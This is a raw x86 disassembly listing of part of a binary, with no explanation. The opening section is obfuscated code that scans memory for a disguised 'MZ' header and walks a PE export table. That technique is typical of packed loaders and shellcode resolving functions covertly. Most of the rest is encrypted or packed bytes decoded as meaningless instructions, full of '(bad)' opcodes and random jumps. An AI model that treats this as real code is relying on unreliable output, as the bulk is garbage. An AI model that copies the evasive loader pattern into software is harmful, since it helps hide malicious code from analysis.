  4191c5:	cmp    DWORD PTR ds:0x42c000,0x5
  4191cc:	jne    0x4191e5
  4191d2:	push   DWORD PTR [ebp-0x14]
  4191d5:	push   0x594c
  4191da:	push   0x7c33
  4191df:	call   DWORD PTR ds:0x425040
  4191e5:	cmp    DWORD PTR ds:0x42c000,0x6
  4191ec:	jne    0x4191ff
  4191f2:	mov    esi,DWORD PTR ds:0x42c000
  4191f8:	dec    esi
  4191f9:	mov    DWORD PTR ds:0x42c000,esi
  4191ff:	xor    esi,esi
  419201:	add    esi,DWORD PTR ds:0x42c000
  419207:	dec    esi
  419208:	mov    DWORD PTR ds:0x42c000,esi
  41920e:	jmp    0x4191b8
  419213:	mov    esi,DWORD PTR [ebp-0x8]
  419216:	and    DWORD PTR ds:0x429020,0x232c
  419220:	xor    eax,ecx
  419222:	inc    DWORD PTR ds:0x429028
  419228:	add    eax,edx
  41922a:	and    DWORD PTR ds:0x42a008,0x32e2
  419234:	imul   eax,DWORD PTR [esi]
  419237:	mov    esi,DWORD PTR [ebp+0x8]
  41923a:	xor    esi,ecx
  41923c:	add    esi,edx
  41923e:	cmp    esi,eax
  419240:	mov    eax,DWORD PTR [ebp-0x4]
  419243:	push   ebx
  419244:	je     0x419263
  41924a:	mov    esi,DWORD PTR [ebp-0x18]
  41924d:	add    DWORD PTR [eax],esi
  41924f:	mov    eax,DWORD PTR [ebp-0x4]
  419252:	mov    esi,DWORD PTR [ebp+0xc]
  419255:	xor    esi,ecx
  419257:	add    esi,edx
  419259:	imul   esi,DWORD PTR [eax]
  41925c:	mov    DWORD PTR [eax],esi
  41925e:	jmp    0x419268
  419263:	mov    esi,DWORD PTR [ebp+0x14]
  419266:	xor    DWORD PTR [eax],esi
  419268:	mov    eax,DWORD PTR [ebp-0x4]
  41926b:	mov    edi,DWORD PTR [ebp+0x10]
  41926e:	xor    edi,ecx
  419270:	mov    esi,0xffcd8d25
  419275:	mov    ebx,esi
  419277:	sub    ebx,edi
  419279:	add    DWORD PTR [eax],ebx
  41927b:	mov    eax,DWORD PTR [ebp-0x4]
  41927e:	mov    edi,DWORD PTR [ebp-0x8]
  419281:	add    edi,DWORD PTR [eax]
  419283:	mov    DWORD PTR [ebp-0x8],edi
  419286:	mov    eax,DWORD PTR [ebp+0xc]
  419289:	mov    edi,DWORD PTR [ebp+0xc]
  41928c:	xor    edi,ecx
  41928e:	xor    eax,ecx
  419290:	lea    eax,[eax+edi*1+0x64e5b6]
  419297:	mov    edi,DWORD PTR [ebp+0xc]
  41929a:	xor    edi,ecx
  41929c:	add    edi,edx
  41929e:	imul   eax,edi
  4192a1:	mov    edi,DWORD PTR [ebp+0xc]
  4192a4:	xor    edi,ecx
  4192a6:	sub    edi,eax
  4192a8:	mov    eax,DWORD PTR [ebp-0x4]
  4192ab:	add    edi,edx
  4192ad:	cmp    DWORD PTR [eax],edi
  4192af:	mov    eax,DWORD PTR [ebp-0x4]
  4192b2:	mov    edi,DWORD PTR [ebp+0x10]
  4192b5:	jg     0x4192c8
  4192bb:	xor    edi,ecx
  4192bd:	mov    ebx,esi
  4192bf:	sub    ebx,edi
  4192c1:	add    DWORD PTR [eax],ebx
  4192c3:	jmp    0x4192ce
  4192c8:	xor    edi,ecx
  4192ca:	add    edi,edx
  4192cc:	add    DWORD PTR [eax],edi
  4192ce:	mov    eax,DWORD PTR [ebp-0x8]
  4192d1:	mov    edi,DWORD PTR [ebp-0x10]
  4192d4:	mov    eax,DWORD PTR [eax]
  4192d6:	xor    edi,ecx
  4192d8:	add    edi,0x3272da
  4192de:	not    edi
  4192e0:	and    eax,edi
  4192e2:	movsx  di,BYTE PTR [eax+0x1]
  4192e7:	mov    ebx,0x3b4b
  4192ec:	sub    di,bx
  4192ef:	mov    ebx,0x8a85
  4192f4:	xor    di,bx
  4192f7:	mov    ebx,0x4f8a
  4192fc:	cmp    di,bx
  4192ff:	jne    0x419327
  419305:	movsx  di,BYTE PTR [eax]
  419309:	mov    ebx,0x3b4b
  41930e:	sub    di,bx
  419311:	mov    ebx,0x8a85
  419316:	xor    di,bx
  419319:	mov    ebx,0x4f87
  41931e:	cmp    di,bx
  419321:	je     0x419337
  419327:	mov    edi,DWORD PTR [ebp-0x10]
  41932a:	xor    edi,ecx
  41932c:	mov    ebx,esi
  41932e:	sub    ebx,edi
  419330:	add    eax,ebx
  419332:	jmp    0x4192e2
  419337:	mov    esi,DWORD PTR [ebp-0x14]
  41933a:	mov    esi,DWORD PTR [esi]
  41933c:	mov    edi,DWORD PTR [eax+0x3c]
  41933f:	lea    esi,[edi+esi*8+0x78]
  419343:	mov    esi,DWORD PTR [esi+eax*1]
  419346:	mov    DWORD PTR [ebp-0x8],esi
  419349:	mov    esi,DWORD PTR [ebp+0x8]
  41934c:	xor    esi,ecx
  41934e:	add    esi,edx
  419350:	mov    DWORD PTR [ebp-0x14],esi
  419353:	mov    esi,DWORD PTR [ebp+0x8]
  419356:	mov    edi,DWORD PTR [ebp-0x8]
  419359:	xor    esi,ecx
  41935b:	add    esi,edx
  41935d:	pop    ebx
  41935e:	cmp    edi,esi
  419360:	jne    0x41937e
  419366:	mov    eax,DWORD PTR [ebp+0xc]
  419369:	xor    eax,ecx
  41936b:	mov    ecx,DWORD PTR [ebp-0x8]
  41936e:	add    eax,edx
  419370:	imul   eax,ecx
  419373:	mov    DWORD PTR [ebp-0x8],eax
  419376:	push   DWORD PTR [ebp+0x18]
  419379:	jmp    0x41b78a
  41937e:	mov    ecx,DWORD PTR [ebp-0x8]
  419381:	add    ecx,eax
  419383:	jmp    0x41b73b
  419388:	dec    ebx
  419389:	cmp    al,0x60
  41938b:	or     DWORD PTR [edi],0x426c6b9d
  419391:	push   cs
  419392:	mov    ch,BYTE PTR [ebx+eiz*2+0x26]
  419396:	shl    edx,0xdf
  419399:	add    DWORD PTR [ecx+0x62],esp
  41939c:	(bad)  
  41939d:	pop    edi
  41939e:	bound  esp,QWORD PTR [edx+0x29]
  4193a1:	daa    
  4193a2:	sbb    cl,BYTE PTR [ebx]
  4193a4:	jns    0x419379
  4193a6:	aaa    
  4193a7:	out    dx,al
  4193a8:	or     dh,BYTE PTR [ebp+0xdab7dd5]
  4193ae:	cld    
  4193af:	(bad)  
  4193b0:	aad    0xd0
  4193b2:	dec    esp
  4193b3:	ret    0x8c6c
  4193b6:	sbb    edi,ecx
  4193b8:	mov    esp,0x386bcdc1
  4193bd:	xor    BYTE PTR [ecx+edx*8+0xf],bl
  4193c1:	int    0x67
  4193c3:	cmc    
  4193c4:	xchg   edx,eax
  4193c5:	sti    
  4193c6:	sub    al,0xe9
  4193c8:	xchg   esp,eax
  4193c9:	sbb    BYTE PTR [edi+0x26796084],al
  4193cf:	hlt    
  4193d0:	sub    eax,0xbdfb5bba
  4193d5:	dec    ebx
  4193d6:	sub    esp,DWORD PTR [ebx+0x53b9c937]
  4193dc:	sub    DWORD PTR [ebx],ecx
  4193de:	int3   
  4193df:	shr    BYTE PTR [edi-0x646c7741],1
  4193e5:	add    ebp,DWORD PTR [ebp+0x50]
  4193e8:	pop    ds
  4193e9:	jnp    0x419402
  4193eb:	int    0xa8
  4193ed:	ret    
  4193ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193ef:	and    BYTE PTR [esi+0x17ae9900],dh
  4193f5:	mov    edx,0x38133dc5
  4193fa:	pop    ebp
  4193fb:	ja     0x419432
  4193fd:	mov    dh,0x78
  4193ff:	call   0x72822e47
  419404:	mov    bl,0x40
  419406:	mov    esp,0x34fc7dd0
  41940b:	repnz aaa 
  41940d:	xor    al,0x27
  41940f:	fsubr  QWORD PTR [esi]
  419411:	sub    edx,ecx
  419413:	push   esp
  419414:	shr    DWORD PTR [ebp+0x2e],cl
  419417:	idiv   DWORD PTR [esi+0x53]
  41941a:	fsincos 
  41941c:	or     DWORD PTR [edx-0x52505b1e],0x4692346f
  419426:	lahf   
  419427:	jbe    0x41942d
  419429:	test   bl,0xa2
  41942c:	into   
  41942d:	push   ebp
  41942e:	lds    ecx,FWORD PTR [eax+edi*8-0x140a2a5]
  419435:	jb     0x419475
  419437:	jg     0x419416
  419439:	pop    eax
  41943a:	xor    BYTE PTR [ecx],0x10
  41943d:	aaa    
  41943e:	jns    0x41943f
  419440:	out    0xdb,eax
  419442:	mov    dl,0x73
  419444:	xor    al,0x8a
  419446:	mov    al,0x2b
  419448:	in     eax,dx
  419449:	pusha  
  41944a:	or     BYTE PTR [ebx],dl
  41944c:	repnz mov dh,0x15
  41944f:	in     eax,dx
  419450:	push   ds
  419451:	push   es
  419452:	adc    al,0x8d
  419454:	xchg   ebx,eax
  419455:	xlat   BYTE PTR ds:[ebx]
  419456:	aam    0xbf
  419458:	pop    es
  419459:	inc    esp
  41945a:	mov    al,ds:0xaa4fd35f
  41945f:	repz jg 0x419456
  419462:	push   ds
  419463:	push   ebp
  419464:	mov    ecx,0xbd9b3498
  419469:	fidiv  DWORD PTR [esi*8-0x65577c23]
  419470:	xchg   edi,eax
  419471:	and    BYTE PTR [ecx+0x4ccf0701],al
  419477:	cmp    DWORD PTR [eax-0x7],edx
  41947a:	out    dx,al
  41947b:	pop    esp
  41947c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41947d:	scas   al,BYTE PTR es:[edi]
  41947e:	cli    
  41947f:	add    BYTE PTR [esi+eiz*4+0x48],bh
  419483:	repz push es
  419485:	sbb    BYTE PTR [ebx],0xd9
  419488:	aas    
  419489:	dec    ebx
  41948a:	ja     0x41948c
  41948c:	cwde   
  41948d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41948e:	adc    bh,BYTE PTR [eax-0x69]
  419491:	xor    DWORD PTR [ebx],0x14
  419494:	mov    cl,cl
  419496:	inc    eax
  419497:	fwait
  419498:	sahf   
  419499:	or     eax,esp
  41949b:	jg     0x41947b
  41949d:	mov    bh,0x7b
  41949f:	jbe    0x4194a1
  4194a1:	js     0x4194fc
  4194a3:	mov    edx,0x989b44f8
  4194a8:	xor    dl,ch
  4194aa:	xchg   bh,bh
  4194ac:	xchg   esp,eax
  4194ad:	mov    ?,WORD PTR [ebp+0x565cad97]
  4194b3:	add    al,0x44
  4194b5:	clc    
  4194b6:	adc    al,0x70
  4194b8:	mov    BYTE PTR [esi-0x43976656],dh
  4194be:	hlt    
  4194bf:	sub    BYTE PTR [ebx],ch
  4194c1:	and    BYTE PTR [eax],ch
  4194c3:	repnz sub ah,dh
  4194c6:	gs daa 
  4194c8:	pop    esp
  4194c9:	ds jmp 0x6fc4:0xfb7b1657
  4194d1:	(bad)  
  4194d2:	sar    dl,cl
  4194d4:	or     eax,0x30473d32
  4194d9:	and    cl,BYTE PTR [edx+0x1faae246]
  4194df:	outs   dx,DWORD PTR ds:[esi]
  4194e0:	in     eax,dx
  4194e1:	int    0x4f
  4194e3:	inc    ebp
  4194e4:	jmp    0x41191e1e
  4194e9:	stc    
  4194ea:	add    bh,0x84
  4194ed:	jbe    0x4194cd
  4194ef:	adc    eax,0x1b3bfb1c
  4194f4:	and    bl,BYTE PTR [ecx-0xa]
  4194f7:	imul   edx,DWORD PTR [eax+ebp*1+0x2f],0xffffffa7
  4194fc:	push   esi
  4194fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194fe:	cld    
  4194ff:	das    
  419500:	inc    edx
  419501:	sbb    DWORD PTR [esi],eax
  419503:	call   0xc424:0xeaf81d5
  41950a:	jle    0x41951a
  41950c:	jp     0x419583
  41950e:	cs mov edi,0xbaf5bdee
  419514:	fwait
  419515:	jl     0x2c76e193
  41951b:	xchg   edi,eax
  41951c:	std    
  41951d:	jecxz  0x419516
  41951f:	mov    ebx,0xf9c4b2fd
  419524:	or     BYTE PTR [ecx-0x7c8d8afa],ah
  41952a:	and    BYTE PTR [edi],ah
  41952c:	push   ebp
  41952d:	pusha  
  41952e:	lds    esi,FWORD PTR [ecx-0x1db59982]
  419534:	mov    edx,0x73ab54b
  419539:	fcom   QWORD PTR ds:0x1283d2e8
  41953f:	push   ss
  419540:	in     al,0x10
  419542:	cdq    
  419543:	adc    DWORD PTR [edx],esp
  419545:	in     al,dx
  419546:	sub    dh,0xb4
  419549:	cmp    bl,dl
  41954b:	retf   
  41954c:	fiadd  WORD PTR [eax-0x5ffaf31f]
  419552:	mov    esp,0x6bdfe5d6
  419557:	ins    BYTE PTR es:[edi],dx
  419558:	cmp    eax,0xf096ced6
  41955d:	sbb    DWORD PTR [edi],0xfffffff1
  419560:	dec    edx
  419561:	mov    dl,0x61
  419563:	sbb    al,0x27
  419565:	push   0xffffffa4
  419567:	add    eax,0xeee07a36
  41956c:	inc    edx
  41956d:	rcr    ebx,cl
  41956f:	mov    ebp,0x16544c9e
  419574:	(bad)  
  419575:	or     al,BYTE PTR [bp+di-0x3c]
  419579:	mov    ds:0xf78495fc,al
  41957e:	jbe    0x419571
  419580:	popa   
  419581:	push   eax
  419582:	aaa    
  419583:	gs fwait
  419585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419586:	mov    bh,0xc5
  419588:	mov    ds:0x8ee90d81,eax
  41958d:	mov    bh,BYTE PTR [ecx]
  41958f:	jmp    0xb8c3:0x5ab96a40
  419596:	sub    al,0x2d
  419598:	fs scas eax,DWORD PTR es:[edi]
  41959a:	js     0x4195fc
  41959c:	test   al,0xbc
  41959e:	aaa    
  41959f:	pop    ss
  4195a0:	(bad)  
  4195a1:	xchg   ecx,eax
  4195a2:	fs rol ebp,0x6
  4195a6:	neg    DWORD PTR [ecx+ebp*2]
  4195a9:	pusha  
  4195aa:	cli    
  4195ab:	lods   eax,DWORD PTR ds:[esi]
  4195ac:	push   cs
  4195ad:	pushf  
  4195ae:	jns    0x419596
  4195b0:	mov    ds:0x8d58cb2e,eax
  4195b5:	dec    esp
  4195b6:	sahf   
  4195b7:	pop    eax
  4195b8:	gs (bad) 
  4195ba:	jnp    0x419554
  4195bc:	test   DWORD PTR [eax],edx
  4195be:	mov    ch,0x6d
  4195c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195c1:	mov    ch,0xe
  4195c3:	loop   0x419614
  4195c5:	dec    ebx
  4195c6:	shl    BYTE PTR [ebx+0x5],cl
  4195c9:	out    0xd0,al
  4195cb:	in     eax,dx
  4195cc:	push   es
  4195cd:	pop    edi
  4195ce:	ins    DWORD PTR es:[edi],dx
  4195cf:	bound  edi,QWORD PTR ds:0x19965e93
  4195d5:	pop    eax
  4195d6:	retf   0x67b3
  4195d9:	cs loope 0x4195e3
  4195dc:	test   BYTE PTR [esi-0x50],ch
  4195df:	mov    bl,0x80
  4195e1:	xor    BYTE PTR [ebx+0xa],dl
  4195e4:	(bad)  
  4195e5:	neg    BYTE PTR [edi]
  4195e7:	xchg   ebp,eax
  4195e8:	gs sbb al,0x85
  4195eb:	hlt    
  4195ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195ed:	mov    DWORD PTR [ebx-0x2fb30963],ebp
  4195f3:	xor    BYTE PTR [edi],bl
  4195f5:	and    eax,0xd2e73d54
  4195fa:	mov    dh,al
  4195fc:	push   0x767428
  419601:	sub    edx,DWORD PTR [ebx-0x38]
  419604:	mov    esi,0x37f500c2
  419609:	les    edi,FWORD PTR [esi-0x5a]
  41960c:	in     eax,0x9e
  41960e:	cmova  eax,DWORD PTR [edx-0x282729f9]
  419615:	mov    dh,0x68
  419617:	ins    BYTE PTR es:[edi],dx
  419618:	cmp    DWORD PTR ds:0x59ae82ed,edx
  41961e:	ins    BYTE PTR es:[edi],dx
  41961f:	cmp    BYTE PTR [edx-0x80f4e1f],dl
  419625:	dec    ebx
  419626:	sub    eax,DWORD PTR [ecx+0x27]
  419629:	ins    DWORD PTR es:[edi],dx
  41962a:	data16 cmp dh,ah
  41962d:	or     al,0x50
  41962f:	push   edi
  419630:	push   edi
  419631:	int3   
  419632:	fs js  0x4196a3
  419635:	sub    al,0x36
  419637:	mov    DWORD PTR [ecx+0x8d547ac],ebx
  41963d:	mov    ds:0x448485c3,eax
  419642:	push   0xf6c4204a
  419647:	in     eax,0x6c
  419649:	ja     0x41960e
  41964b:	and    eax,DWORD PTR [ebx]
  41964d:	cmp    al,0xb7
  41964f:	pop    es
  419650:	add    DWORD PTR [ebp-0x5476c842],ebp
  419656:	and    eax,0xe7d4cb12
  41965b:	push   0x1d0e2d22
  419660:	test   eax,0x7045ec8c
  419665:	loopne 0x4195ef
  419667:	ds xor al,0x75
  41966a:	xchg   edx,eax
  41966b:	adc    ah,BYTE PTR [edi]
  41966d:	in     eax,0x74
  41966f:	or     eax,0xaf68af5f
  419674:	loop   0x41963a
  419676:	sub    BYTE PTR [edi-0xdaf956e],bh
  41967c:	mov    edi,0x6bb7880
  419681:	sub    esp,DWORD PTR gs:[ebx-0x37]
  419685:	outs   dx,BYTE PTR ds:[esi]
  419686:	pop    ecx
  419687:	retf   
  419688:	push   edx
  419689:	and    esi,DWORD PTR [eax+0x32d8b54e]
  41968f:	fwait
  419690:	sbb    eax,0x4d3c349
  419695:	clc    
  419696:	mov    dl,0x9a
  419698:	add    ebx,DWORD PTR [ebp-0x1b829382]
  41969e:	adc    esi,0x31
  4196a1:	rcr    DWORD PTR [edx+0x78381db7],1
  4196a7:	inc    ebp
  4196a8:	outs   dx,BYTE PTR ds:[esi]
  4196a9:	shl    DWORD PTR [edi+0x7a057a61],0xc0
  4196b0:	retf   0xfac0
  4196b3:	(bad)  
  4196b4:	fiadd  WORD PTR [ecx]
  4196b6:	gs je  0x4196dc
  4196b9:	and    esi,DWORD PTR [ebx-0x7deb1c4f]
  4196bf:	push   ebp
  4196c0:	repnz add dl,BYTE PTR [edi-0x5823df5e]
  4196c7:	psubb  mm0,mm0
  4196ca:	xchg   esp,eax
  4196cb:	mov    bh,0xd3
  4196cd:	sbb    eax,0xfc4fc44d
  4196d2:	std    
  4196d3:	ret    
  4196d4:	add    bl,dh
  4196d6:	cmp    bl,0xbb
  4196d9:	ins    BYTE PTR es:[edi],dx
  4196da:	cmp    cl,al
  4196dc:	or     al,0xca
  4196df:	je     0x419747
  4196e1:	jno    0x41968f
  4196e3:	mov    ecx,edi
  4196e5:	std    
  4196e6:	bound  esi,QWORD PTR [esi]
  4196e8:	stos   BYTE PTR es:[edi],al
  4196e9:	int3   
  4196ea:	(bad)  
  4196eb:	mov    esp,0x75fcfb2f
  4196f0:	xor    edx,ecx
  4196f2:	or     BYTE PTR [edx],ch
  4196f4:	in     eax,0xb7
  4196f6:	sbb    eax,0xc502ef4d
  4196fb:	and    esi,DWORD PTR [esi+ecx*8+0x41df295a]
  419702:	xor    al,0xcf
  419704:	add    BYTE PTR [edi-0x37],0x56
  419708:	outs   dx,BYTE PTR ds:[esi]
  419709:	das    
  41970a:	in     eax,dx
  41970b:	(bad)  
  41970c:	not    ecx
  41970e:	fmul   QWORD PTR [ebp-0x37]
  419711:	leave  
  419712:	jmp    0x11d7502c
  419717:	je     0x419706
  419719:	dec    DWORD PTR [eax-0x423797e9]
  41971f:	les    ebx,FWORD PTR [eax]
  419721:	jecxz  0x4196e7
  419723:	push   eax
  419724:	jno    0x419722
  419726:	arpl   WORD PTR [eax+0x5f],ax
  419729:	inc    ebp
  41972a:	hlt    
  41972b:	aaa    
  41972c:	pop    eax
  41972d:	xchg   ecx,eax
  41972e:	arpl   WORD PTR [ebx-0x5f],cx
  419731:	scas   al,BYTE PTR es:[edi]
  419732:	pop    ebp
  419733:	mov    al,0xa
  419735:	and    al,0xb7
  419737:	int    0xb4
  419739:	xchg   ebx,esp
  41973b:	xchg   esp,eax
  41973c:	fidiv  DWORD PTR [edi-0x3c617dcd]
  419742:	stos   DWORD PTR es:[edi],eax
  419743:	mov    eax,?
  419745:	sbb    al,0xa5
  419747:	or     DWORD PTR [ebx+ecx*1-0x7f],0xffffffa6
  41974c:	mov    al,0x70
  41974e:	int    0x75
  419750:	sub    eax,0x84c1acd7
  419755:	cdq    
  419756:	jbe    0x41978b
  419758:	xchg   esi,ecx
  41975a:	leave  
  41975b:	test   DWORD PTR [eax+0x690f053f],esi
  419761:	pop    ds
  419762:	xchg   ebp,eax
  419763:	adc    eax,0xb65d22cb
  419768:	scas   eax,DWORD PTR es:[edi]
  419769:	fisubr DWORD PTR [esi]
  41976b:	adc    eax,0x88428906
  419770:	cmp    al,bh
  419772:	sub    DWORD PTR [ebx-0x7cecc835],0xffffffef
  419779:	push   ds
  41977a:	iret   
  41977b:	adc    ebx,ecx
  41977d:	mov    bh,BYTE PTR [ecx]
  41977f:	mov    ebx,0xeeca8f1d
  419784:	js     0x41971c
  419786:	out    dx,eax
  419787:	and    eax,0xb7dbd88
  41978c:	adc    dh,BYTE PTR [ebp+0x1a]
  41978f:	(bad)  
  419790:	push   ss
  419791:	sbb    DWORD PTR [ebx-0x12],ebp
  419794:	adc    esi,DWORD PTR [edx+0x56]
  419797:	sahf   
  419798:	int3   
  419799:	or     BYTE PTR [ebx],bh
  41979b:	mov    eax,0x32baafab
  4197a0:	push   eax
  4197a1:	pop    edi
  4197a2:	cli    
  4197a3:	inc    ecx
  4197a4:	mov    ch,0xb5
  4197a6:	pop    ebx
  4197a7:	xchg   esp,eax
  4197a8:	mov    dl,0x7c
  4197aa:	call   0xf092:0xf3b302fe
  4197b1:	cmc    
  4197b2:	aad    0x79
  4197b4:	pushf  
  4197b5:	loop   0x4197bc
  4197b7:	push   0x95cf6a05
  4197bc:	pop    esp
  4197bd:	jb     0x4197e1
  4197bf:	dec    edx
  4197c0:	je     0x41982b
  4197c2:	outs   dx,DWORD PTR ds:[esi]
  4197c3:	ja     0x4197eb
  4197c5:	cmc    
  4197c6:	lea    ecx,[edi+ebx*2-0x35218451]
  4197cd:	push   cs
  4197ce:	stc    
  4197cf:	push   edx
  4197d0:	ja     0x419758
  4197d2:	push   0xffffffa8
  4197d4:	int    0x6c
  4197d6:	popf   
  4197d7:	nop
  4197d8:	xchg   ebp,eax
  4197d9:	sub    DWORD PTR [ecx+0x62],0x765b42a0
  4197e0:	mov    esi,0x2789c6df
  4197e5:	outs   dx,BYTE PTR ds:[esi]
  4197e6:	ror    DWORD PTR [ecx],0xf8
  4197e9:	or     ecx,esi
  4197eb:	mov    ch,0x1d
  4197ed:	add    eax,0x6b77e561
  4197f2:	xchg   esi,eax
  4197f3:	push   ss
  4197f4:	popf   
  4197f5:	cli    
  4197f6:	inc    esp
  4197f7:	es popa 
  4197f9:	push   ds
  4197fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197fb:	lods   eax,DWORD PTR ds:[esi]
  4197fc:	jp     0x41977e
  4197fe:	jl     0x419843
  419800:	dec    edi
  419801:	sbb    eax,0x25e08b53
  419806:	mov    WORD PTR [edx+0x2d],es
  419809:	mov    ch,0x4
  41980b:	mov    bh,0x31
  41980d:	fld1   
  41980f:	cwde   
  419810:	and    BYTE PTR [edx-0x2b3749e7],cl
  419816:	ret    0xa027
  419819:	xchg   ebp,eax
  41981a:	mov    dl,ch
  41981c:	loop   0x419818
  41981e:	hlt    
  41981f:	add    DWORD PTR ds:0x67f7ad6f,ecx
  419825:	icebp  
  419826:	jno    0x41981f
  419828:	cmp    al,0x20
  41982a:	ins    BYTE PTR es:[edi],dx
  41982b:	outs   dx,DWORD PTR ds:[esi]
  41982c:	adc    al,0x61
  41982e:	pop    edi
  41982f:	push   ecx
  419830:	xor    eax,0xe46ddc18
  419835:	sbb    eax,0x33cfa5de
  41983a:	stc    
  41983b:	jp     0x4197d0
  41983d:	loop   0x419881
  41983f:	mov    bh,BYTE PTR [edi-0x42]
  419842:	lods   eax,DWORD PTR ds:[esi]
  419843:	jmp    0x3c13c3fb
  419848:	jg     0x419802
  41984a:	mov    ah,0xbd
  41984c:	xor    al,0x12
  41984e:	out    dx,al
  41984f:	call   FWORD PTR [edi-0x34990222]
  419855:	rcl    BYTE PTR [ecx+0x1018adeb],0x5a
  41985c:	bound  ebx,QWORD PTR [ebx-0x23785add]
  419862:	add    ch,BYTE PTR [esi]
  419864:	loope  0x419850
  419866:	push   ss
  419867:	call   0x7d1e:0x1307028a
  41986e:	xor    eax,0x4effa0a2
  419873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419874:	pop    ebx
  419875:	xchg   ebx,eax
  419876:	(bad)  
  419877:	dec    ebx
  419878:	adc    ecx,ecx
  41987a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41987b:	push   0xffffff9e
  41987d:	pushf  
  41987e:	fucomip st,st(6)
  419880:	out    dx,eax
  419881:	(bad)  
  419882:	ror    esi,1
  419884:	xchg   esp,eax
  419885:	or     DWORD PTR [ebx],ecx
  419887:	mov    ebx,0x513299d
  41988c:	xchg   ebx,eax
  41988d:	or     al,0xcf
  41988f:	jl     0x4198e7
  419891:	loope  0x4198bc
  419893:	in     al,dx
  419894:	inc    ebp
  419895:	push   es
  419896:	mov    WORD PTR [esi],cs
  419898:	mov    DWORD PTR [esi-0x5d],edi
  41989b:	repz add DWORD PTR [ecx+0x7c8fd1ae],0x7d
  4198a3:	xor    DWORD PTR [ebx+edi*8],edx
  4198a6:	mov    bl,0x30
  4198a8:	stos   BYTE PTR es:[edi],al
  4198a9:	sbb    al,0xf4
  4198ab:	daa    
  4198ac:	add    eax,0x1a298a0
  4198b1:	loope  0x419845
  4198b3:	outs   dx,BYTE PTR ds:[esi]
  4198b4:	sbb    DWORD PTR [edi],ebp
  4198b6:	out    dx,eax
  4198b7:	ret    
  4198b8:	mov    esi,0xe1fbc5fa
  4198bd:	jo     0x419931
  4198bf:	daa    
  4198c0:	xchg   esi,eax
  4198c1:	mov    esp,0x68784be
  4198c6:	lds    esp,FWORD PTR [ecx-0x7c]
  4198c9:	out    dx,eax
  4198ca:	cmc    
  4198cb:	call   0x44c9:0xb51d27df
  4198d2:	dec    edx
  4198d3:	push   esp
  4198d4:	test   eax,0x20a710d
  4198d9:	fwait
  4198da:	(bad)  
  4198db:	out    dx,al
  4198dc:	fsubr  DWORD PTR [esi-0x77]
  4198df:	jae    0x4198d7
  4198e1:	and    al,0xc5
  4198e3:	and    ebp,0x1c
  4198e6:	nop
  4198e7:	mov    ebp,0x6641d0c6
  4198ec:	jmp    FWORD PTR [eax+0x36]
  4198ef:	wrmsr  
  4198f1:	ficomp DWORD PTR [ebx+0x6a]
  4198f4:	xor    ah,BYTE PTR [esi]
  4198f6:	repnz lds eax,FWORD PTR [esi]
  4198f9:	add    eax,0x23fb919c
  4198fe:	mov    esp,0x12a08fda
  419903:	into   
  419904:	fs das 
  419906:	pop    ss
  419907:	push   edx
  419908:	mov    eax,0xed0a59dd
  41990d:	inc    esi
  41990e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41990f:	and    edx,edx
  419911:	les    ebx,FWORD PTR [edx+0x67c95838]
  419917:	jo     0x4198fc
  419919:	xchg   esp,eax
  41991a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41991c:	sbb    DWORD PTR [edx-0x19],0x67ec5856
  419923:	out    dx,al
  419924:	dec    ebx
  419925:	pushf  
  419926:	loope  0x419994
  419928:	test   al,0x11
  41992a:	in     eax,dx
  41992b:	jecxz  0x41994d
  41992d:	stos   DWORD PTR es:[edi],eax
  41992e:	jp     0x419914
  419930:	addr16 aam 0x3e
  419933:	addr16 jb 0x419969
  419936:	bound  edx,QWORD PTR [edx]
  419938:	pop    ebx
  419939:	out    dx,eax
  41993a:	xchg   ecx,eax
  41993b:	hlt    
  41993c:	fdivp  st(3),st
  41993e:	repz scas al,BYTE PTR es:[edi]
  419940:	push   esp
  419941:	adc    eax,edi
  419943:	or     al,0xf1
  419945:	enter  0xcfe2,0x84
  419949:	jecxz  0x4199be
  41994b:	push   ebp
  41994c:	adc    al,0x23
  41994e:	mov    edi,0xf1d44102
  419953:	adc    DWORD PTR [esi-0xd25ae92],ecx
  419959:	jns    0x419928
  41995b:	sub    edi,esp
  41995d:	mov    ebx,0xddc27f05
  419962:	add    esi,edi
  419964:	pop    esi
  419965:	jb     0x41994b
  419967:	xchg   ebx,eax
  419968:	(bad)  
  419969:	jmp    0xb8783789
  41996e:	fnstcw WORD PTR [ebp+0x1d]
  419971:	add    ebp,DWORD PTR [esi+0x98fdd05]
  419977:	jge    0x41998a
  419979:	fsub   QWORD PTR [edx+0x5bb21fc1]
  41997f:	mov    esi,0x6aa982f4
  419984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419985:	add    ecx,DWORD PTR [esi]
  419987:	jne    0x41998a
  419989:	ficom  WORD PTR [edi]
  41998b:	pop    esi
  41998c:	retf   
  41998d:	int3   
  41998e:	lods   al,BYTE PTR ds:[esi]
  41998f:	dec    edx
  419990:	push   esi
  419991:	fisttp DWORD PTR [ecx+0x74eb667]
  419997:	cmp    BYTE PTR [ebx-0x7a],ah
  41999a:	icebp  
  41999b:	push   ebx
  41999c:	jecxz  0x4199a6
  41999e:	dec    ebx
  41999f:	and    al,0x47
  4199a1:	fild   QWORD PTR [ecx+0x2cd49416]
  4199a7:	rcl    BYTE PTR [edi],0x8b
  4199aa:	or     DWORD PTR [ebx+esi*1+0x79],0xf6886d98
  4199b2:	or     al,0xa8
  4199b4:	or     BYTE PTR [edx-0x153bb9a7],al
  4199ba:	mov    bl,0xde
  4199bc:	mov    WORD PTR [ebx+0x17bd36cb],es
  4199c2:	jmp    0x9ad706b3
  4199c7:	scas   al,BYTE PTR es:[edi]
  4199c8:	ss jle 0x41995d
  4199cb:	jae    0x4199e7
  4199cd:	mov    ds:0x3a3e2046,eax
  4199d2:	pop    ecx
  4199d3:	mov    edi,0x633128d3
  4199d8:	xchg   edx,eax
  4199d9:	fdivr  QWORD PTR [ebp+0x3ec79e9d]
